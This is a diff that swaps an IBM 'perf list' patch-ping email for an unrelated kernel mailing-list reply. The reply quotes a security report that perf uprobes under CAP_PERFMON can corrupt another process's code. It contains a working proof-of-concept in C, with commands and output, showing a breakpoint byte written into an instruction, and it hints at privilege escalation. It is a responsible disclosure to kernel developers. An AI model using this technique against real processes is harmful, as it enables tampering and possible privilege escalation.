@@ -1,151 +1,209 @@
-Received: from mx0a-001b2d01.pphosted.com (mx0a-001b2d01.pphosted.com [148.163.156.1])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8662723C8C5;
-	Wed,  2 Jul 2025 08:58:07 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=148.163.156.1
+Received: from foss.arm.com (foss.arm.com [217.140.110.172])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5E72123956E;
+	Wed,  2 Jul 2025 11:13:24 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.140.110.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1751446689; cv=none; b=k/Kixy7CTW6k2+Bc7cCh24d0cI2xkHv+B8xN6J2nVoga32BvgFJ57GdAQ0OAoy7qWk3PAVBKTz/LJ1WTtK31RlNWse+frrdN6HhlUvBvu1MJ46vzLQporE/rZ4hdyNwAOxZheJvPgknXz9JmCaEmtzlyU/f/wkQ2Q5CcGvyr6RY=
+	t=1751454806; cv=none; b=M65k/MUrHDWp/fud7jB0wRiyZ5dc8qbYFmDVUN9oa8551pXv9HGgqmSSayeqcu2CyG1Aknu9cxMYrCVwMd4w44FFtSeHww+93W2vPVqEVm0/gUqkg4KIIcJNeTsZDJYGqLmhFxH0CpCOE6GSQscSXavLQS+rJVX9ZmsaEesRSf0=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1751446689; c=relaxed/simple;
-	bh=hN6X+y4YJsDLqBUBF+puGdtAc8xXvaGCEdfGLztGYmo=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=LCuJbO5M7Y/dsVaOeIzzYfPURrsVCzZ1yApyEe+VMGYkH5lRQ1TSNvXLmxcZ8LbNUEhfrHNy5130z0rXtgGZC7MViHZ9JXBo0+WNAR4dd7bxVjpunkofpm/iEUc0C/YNV7K+Jvo11+hgRR2uf2lXGrrgk1bfYVa4yNBVITWP/hA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.ibm.com; spf=pass smtp.mailfrom=linux.ibm.com; dkim=pass (2048-bit key) header.d=ibm.com header.i=@ibm.com header.b=aHoNOOqj; arc=none smtp.client-ip=148.163.156.1
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.ibm.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.ibm.com
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=ibm.com header.i=@ibm.com header.b="aHoNOOqj"
-Received: from pps.filterd (m0353729.ppops.net [127.0.0.1])
-	by mx0a-001b2d01.pphosted.com (8.18.1.2/8.18.1.2) with ESMTP id 5625SuGh024499;
-	Wed, 2 Jul 2025 08:58:05 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ibm.com; h=cc
-	:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=pp1; bh=vcyYqz
-	MTUtZIDyj+coq/f+ClbS9PwNEG6AskO6e1rCA=; b=aHoNOOqjsWwXcyKmN5quzA
-	k8xyIsckkTv4W2fAxCGlhcpeyiO4BbqQHXXiK8lPrUd0Kn3xeR+cFY2o0jypLGyF
-	rQxmMj8gc68/Mw9vC8mE+Titbh3lf+dXV1tXPfcR/UidDS711GgWsXiuCbHsa8JF
-	SO9/nc+FngSlXLyu0vkJKbrLFuSA8QSFh2y/8w5r9gKuSki81WaBTabH5LcGlu9c
-	20U/azaryf+XIP7kZIH6sQAWDW3F+nl1rqMDIow0f0Y3QWymbxkRPqbW2s92ZQXP
-	L2MYfTKUV903KEIsFY7+0xDBvqs5iyzfb3i0HKZU5pAqVZhd/sINY7uwnqMc9kaQ
-	==
-Received: from pps.reinject (localhost [127.0.0.1])
-	by mx0a-001b2d01.pphosted.com (PPS) with ESMTPS id 47j830v9ty-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Wed, 02 Jul 2025 08:58:05 +0000 (GMT)
-Received: from m0353729.ppops.net (m0353729.ppops.net [127.0.0.1])
-	by pps.reinject (8.18.0.8/8.18.0.8) with ESMTP id 5628sM21020554;
-	Wed, 2 Jul 2025 08:58:04 GMT
-Received: from ppma21.wdc07v.mail.ibm.com (5b.69.3da9.ip4.static.sl-reverse.com [169.61.105.91])
-	by mx0a-001b2d01.pphosted.com (PPS) with ESMTPS id 47j830v9tv-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Wed, 02 Jul 2025 08:58:04 +0000 (GMT)
-Received: from pps.filterd (ppma21.wdc07v.mail.ibm.com [127.0.0.1])
-	by ppma21.wdc07v.mail.ibm.com (8.18.1.2/8.18.1.2) with ESMTP id 5625UGY3021906;
-	Wed, 2 Jul 2025 08:58:03 GMT
-Received: from smtprelay02.fra02v.mail.ibm.com ([9.218.2.226])
-	by ppma21.wdc07v.mail.ibm.com (PPS) with ESMTPS id 47juqpppgj-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Wed, 02 Jul 2025 08:58:03 +0000
-Received: from smtpav02.fra02v.mail.ibm.com (smtpav02.fra02v.mail.ibm.com [10.20.54.101])
-	by smtprelay02.fra02v.mail.ibm.com (8.14.9/8.14.9/NCO v10.0) with ESMTP id 5628vx6O46531040
-	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
-	Wed, 2 Jul 2025 08:57:59 GMT
-Received: from smtpav02.fra02v.mail.ibm.com (unknown [127.0.0.1])
-	by IMSVA (Postfix) with ESMTP id 0E07C20043;
-	Wed,  2 Jul 2025 08:57:59 +0000 (GMT)
-Received: from smtpav02.fra02v.mail.ibm.com (unknown [127.0.0.1])
-	by IMSVA (Postfix) with ESMTP id D650420040;
-	Wed,  2 Jul 2025 08:57:58 +0000 (GMT)
-Received: from [9.152.212.130] (unknown [9.152.212.130])
-	by smtpav02.fra02v.mail.ibm.com (Postfix) with ESMTP;
-	Wed,  2 Jul 2025 08:57:58 +0000 (GMT)
-Message-ID: <a63ecea7-8ab0-4691-897c-09f6efa82068@linux.ibm.com>
-Date: Wed, 2 Jul 2025 10:57:58 +0200
+	s=arc-20240116; t=1751454806; c=relaxed/simple;
+	bh=O4m4hWzSFeOYN9mZ0ZgX38tbQ6F3yuF4mDW0ZT8cyHc=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=l1XWStTBuDdiJEYt+mOO31EkBQgi7F7GInmEgOa56Dx1hS1bp1MREI4P4ZP/ydz9NJzgt6RUrq+zP4ykyNTKh89Fb82x+FJgx3fSF3g2rzncmw8N58MXhGE50YoeJYdMRyyeeY2f96j8RPL55n7tkqCcpXA3b0GNfI/T2RF2bSg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com; spf=pass smtp.mailfrom=arm.com; arc=none smtp.client-ip=217.140.110.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=arm.com
+Received: from usa-sjc-imap-foss1.foss.arm.com (unknown [10.121.207.14])
+	by usa-sjc-mx-foss1.foss.arm.com (Postfix) with ESMTP id 9351B22D9;
+	Wed,  2 Jul 2025 04:13:08 -0700 (PDT)
+Received: from J2N7QTR9R3 (usa-sjc-imap-foss1.foss.arm.com [10.121.207.14])
+	by usa-sjc-imap-foss1.foss.arm.com (Postfix) with ESMTPSA id 17FBE3F6A8;
+	Wed,  2 Jul 2025 04:13:19 -0700 (PDT)
+Date: Wed, 2 Jul 2025 12:13:17 +0100
+From: Mark Rutland <mark.rutland@arm.com>
+To: Jann Horn <jannh@google.com>
+Cc: Serge Hallyn <serge@hallyn.com>,
+	linux-security-module <linux-security-module@vger.kernel.org>,
+	Peter Zijlstra <peterz@infradead.org>,
+	Ingo Molnar <mingo@redhat.com>,
+	Arnaldo Carvalho de Melo <acme@kernel.org>,
+	Namhyung Kim <namhyung@kernel.org>,
+	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
+	Jiri Olsa <jolsa@kernel.org>, Ian Rogers <irogers@google.com>,
+	Adrian Hunter <adrian.hunter@intel.com>,
+	"Liang, Kan" <kan.liang@linux.intel.com>,
+	linux-perf-users@vger.kernel.org,
+	Kernel Hardening <kernel-hardening@lists.openwall.com>,
+	linux-hardening@vger.kernel.org,
+	kernel list <linux-kernel@vger.kernel.org>,
+	Alexey Budankov <alexey.budankov@linux.intel.com>,
+	James Morris <jamorris@linux.microsoft.com>
+Subject: Re: uprobes are destructive but exposed by perf under CAP_PERFMON
+Message-ID: <aGUUTII8p3x29VEw@J2N7QTR9R3>
+References: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 Precedence: bulk
 X-Mailing-List: linux-perf-users@vger.kernel.org
 List-Id: <linux-perf-users.vger.kernel.org>
 List-Subscribe: <mailto:linux-perf-users+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-perf-users+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [Ping][PATCH] perf list: Add IBM z17 event descriptions
-To: Ian Rogers <irogers@google.com>,
-        Arnaldo Carvalho de Melo <acme@kernel.org>,
-        Namhyung Kim <namhyung@kernel.org>
-Cc: Arnaldo Carvalho de Melo <acme@kernel.org>, linux-kernel@vger.kernel.org,
-        linux-perf-users@vger.kernel.org, agordeev@linux.ibm.com,
-        gor@linux.ibm.com, hca@linux.ibm.com
-References: <20250623132731.899525-1-tmricht@linux.ibm.com>
- <CAP-5=fV_hXzq0A-91NakejcQGnvPp+uJGGe=vccwM+47JVCmtA@mail.gmail.com>
- <ad905a68-a89b-458d-8a8b-2081a6656b91@linux.ibm.com>
- <283e109b-9eb5-4e7d-b7df-215f54496503@linux.ibm.com>
- <CAP-5=fVcNqE9txXQgO+EUV6xz3Mvsqin9FP8FNUztPp35LW2Ng@mail.gmail.com>
-Content-Language: en-US
-From: Thomas Richter <tmricht@linux.ibm.com>
-Organization: IBM
-In-Reply-To: <CAP-5=fVcNqE9txXQgO+EUV6xz3Mvsqin9FP8FNUztPp35LW2Ng@mail.gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
-X-TM-AS-GCONF: 00
-X-Proofpoint-ORIG-GUID: xhxVdaFy5r3v5RLH9nAGTYN47Piw0eDJ
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjUwNzAyMDA3MCBTYWx0ZWRfX+j4mUWqGyzWF dhnEosHuZ4W6EmJ3BzgBRIxMoRE+nba4Iy/46YdffLf9Y8IxrNAgAVdnHJpu/lFCT2w7QZ22Vye tqlvHEubbZlNj4z30ux7BzdyBSUMWW5DNByQ8cM8mkDkfphT553PyL23Hg72eAWUlv101kbXUBS
- SQx/D6sBF6sUdv9L8j1KxDqf1AxNzKU9c1uGjydeg3u2oBXQmHnfWlhSodrT9b2v3Z8a3KgYwfp rigA/XXcdFixjOx/J8tljEXFrWzyWWf81iw+pd09lS/HXy3sLh6aDkY6CPnYqKtSonGsPu9BY8i fynUBiviZihrm/rdmOFBwb7qEPUZPP9+QT2ZKQSAuICRxG30BiIALpwRUEv1yylicIIrPM23gCd
- oePcVY4ImTwC2I9STalD8TYTheAtJpPpZnUWDW5d2CD8sO0J8O4UVXbriUYvbQfgl4IqWv0u
-X-Authority-Analysis: v=2.4 cv=MOlgmNZl c=1 sm=1 tr=0 ts=6864f49d cx=c_pps a=GFwsV6G8L6GxiO2Y/PsHdQ==:117 a=GFwsV6G8L6GxiO2Y/PsHdQ==:17 a=IkcTkHD0fZMA:10 a=Wb1JkmetP80A:10 a=VnNF1IyMAAAA:8 a=1XWaLZrsAAAA:8 a=VTD5pCTsERiSmnhXbdAA:9 a=3ZKOabzyN94A:10
- a=QEXdDO2ut3YA:10
-X-Proofpoint-GUID: Li_SBf8Twpxvmp5U0LO_3fcQzeIwJ4OT
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1099,Hydra:6.1.7,FMLib:17.12.80.40
- definitions=2025-07-02_01,2025-06-27_01,2025-03-28_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0 phishscore=0 mlxscore=0
- adultscore=0 suspectscore=0 bulkscore=0 clxscore=1015 impostorscore=0
- priorityscore=1501 mlxlogscore=999 spamscore=0 malwarescore=0
- lowpriorityscore=0 classifier=spam authscore=0 authtc=n/a authcc=
- route=outbound adjust=0 reason=mlx scancount=1 engine=8.19.0-2505280000
- definitions=main-2507020070
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 
-On 6/27/25 18:55, Ian Rogers wrote:
-> On Fri, Jun 27, 2025 at 1:13 AM Thomas Richter <tmricht@linux.ibm.com> wrote:
->>
->> On 6/24/25 08:35, Thomas Richter wrote:
->>
->> Gently Ping
->>
->> Ian, I have responded to your comments some days ago.
+On Tue, Jul 01, 2025 at 06:14:51PM +0200, Jann Horn wrote:
+> Since commit c9e0924e5c2b ("perf/core: open access to probes for
+> CAP_PERFMON privileged process"), it is possible to create uprobes
+> through perf_event_open() when the caller has CAP_PERFMON. uprobes can
+> have destructive effects, while my understanding is that CAP_PERFMON
+> is supposed to only let you _read_ stuff (like registers and stack
+> memory) from other processes, but not modify their execution.
+
+I'm not sure whether CAP_PERFMON is meant to ensure that, or simply
+meant to provide lesser privileges than CAP_SYS_ADMIN, so I'll have to
+leave that discussion to others. I agree it seems undesirable to permit
+destructive effects.
+
+> uprobes (at least on x86) can be destructive because they have no
+> protection against poking in the middle of an instruction; basically
+> as long as the kernel manages to decode the instruction bytes at the
+> caller-specified offset as a relocatable instruction, a breakpoint
+> instruction can be installed at that offset.
+
+FWIW, similar issues would apply to other architectures (even those like
+arm64 where instuctions are fixed-size and naturally aligned), as a
+uprobe could be placed on a literal pool in a text section, corrupting
+data.
+
+It looks like c9e0924e5c2b reverts cleanly, so that's an option.
+
+Mark.
+
+> This means uprobes can be used to alter what happens in another
+> process. It would probably be a good idea to go back to requiring
+> CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
+> where the kernel can prove that the software breakpoint poke cannot
+> break the target process. (Which seems harder than doing it for
+> kprobe, since kprobe can at least rely on symbols to figure out where
+> a function starts...)
 > 
-> Thanks Thomas, minor nit in your explanation the events must exist as
-> they are in json, but the json events are only exposed if the PMU is
-> present, so the has_event is more of a has_pmu test. Maybe we should
-> add a function like this to the metrics to make this kind of case
-> clearer. Maybe `perf list` should test the events of a metric and hide
-> metrics when the events aren't available to avoid the have_event
-> logic. I'm a bit uncomfortable with that as the events may not be
-> available because of permission issues, but it'd still be useful to
-> know the metrics are around. Anyway I'm digressing.
+> As a small example, in one terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
+> #include <unistd.h>
+> #include <stdio.h>
 > 
-> Reviewed-by: Ian Rogers <irogers@google.com>
+> __attribute__((noinline))
+> void bar(unsigned long value) {
+>   printf("bar(0x%lx)\n", value);
+> }
 > 
-> Thanks,
-> Ian
+> __attribute__((noinline))
+> void foo(unsigned long value) {
+>   value += 0x90909090;
+>   bar(value);
+> }
 > 
-
-Arnaldo, Namhyung,
-
-with Ian Rogers Reviewed-by: approval, it is possible to
-accept this patch soon, so it will land in the next merge-window.
-
-That will give me an commit-id which I need for my addon work.
-
-Thanks a lot for your help.
-
--- 
-Thomas Richter, Dept 3303, IBM s390 Linux Development, Boeblingen, Germany
---
-IBM Deutschland Research & Development GmbH
-
-Vorsitzender des Aufsichtsrats: Wolfgang Wendt
-
-Geschäftsführung: David Faller
-
-Sitz der Gesellschaft: Böblingen / Registergericht: Amtsgericht Stuttgart, HRB 243294
+> void (*foo_ptr)(unsigned long value) = foo;
+> 
+> int main(void) {
+>   while (1) {
+>     printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
+> *)(void*)foo)[1]);
+>     foo_ptr(0);
+>     sleep(1);
+>   }
+> }
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
+> jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
+> [...]
+> 00000000000011b0 <foo>:
+>     11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
+>     11b5:       48 01 c7                add    %rax,%rdi
+>     11b8:       eb d6                   jmp    1190 <bar>
+> [...]
+> jannh@horn:~/test/perfmon-uprobepoke$ ./target
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> ```
+> 
+> and in another terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <unistd.h>
+> #include <err.h>
+> #include <sys/mman.h>
+> #include <sys/syscall.h>
+> #include <linux/perf_event.h>
+> 
+> int main(void) {
+>   int uprobe_type;
+>   FILE *uprobe_type_file =
+> fopen("/sys/bus/event_source/devices/uprobe/type", "r");
+>   if (uprobe_type_file == NULL)
+>     err(1, "fopen uprobe type");
+>   if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
+>     errx(1, "read uprobe type");
+>   fclose(uprobe_type_file);
+>   printf("uprobe type is %d\n", uprobe_type);
+> 
+>   unsigned long target_off;
+>   FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
+>   if (!pof)
+>     err(1, "popen nm");
+>   if (fscanf(pof, "%lx", &target_off) != 1)
+>     errx(1, "read target offset");
+>   pclose(pof);
+>   target_off += 1;
+>   printf("will poke at 0x%lx\n", target_off);
+> 
+>   struct perf_event_attr attr = {
+>     .type = uprobe_type,
+>     .size = sizeof(struct perf_event_attr),
+>     .sample_period = 100000,
+>     .sample_type = PERF_SAMPLE_IP,
+>     .uprobe_path = (unsigned long)"target",
+>     .probe_offset = target_off
+>   };
+>   int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
+>   if (perf_fd == -1)
+>     err(1, "perf_event_open");
+>   char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
+>   if (map == MAP_FAILED)
+>     err(1, "mmap error");
+>   printf("mmap success\n");
+>   while (1) pause();
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
+> jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
+> jannh@horn:~/test/perfmon-uprobepoke$ ./poke
+> uprobe type is 9
+> will poke at 0x11b1
+> mmap success
+> ```
+> 
+> This results in the first terminal changing output as follows, showing
+> that 0xcc was written into the middle of the "mov" instruction,
+> modifying its immediate operand:
+> ```
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> ```
+> 
+> It's probably possible to turn this into a privilege escalation by
+> doing things like clobbering part of the distance of a jump or call
+> instruction.
